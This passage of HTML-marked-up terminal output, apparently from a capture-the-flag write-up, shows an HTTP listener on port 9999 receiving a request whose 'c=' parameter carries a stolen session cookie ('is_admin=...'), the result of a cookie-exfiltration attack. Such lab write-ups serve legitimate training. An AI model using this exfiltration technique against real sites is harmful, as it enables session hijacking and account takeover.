&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Serving HTTP on 0.0.0.0 port &lt;span class="m">9999&lt;/span> &lt;span class="o">(&lt;/span>http://0.0.0.0:9999/&lt;span class="o">)&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10.10.11.8 - - 26/Mar/2024 14:15:48&lt;span class="o">]&lt;/span> &lt;span class="s2">&amp;#34;GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1&amp;#34;&lt;/span> &lt;span class="m">200&lt;/span> -
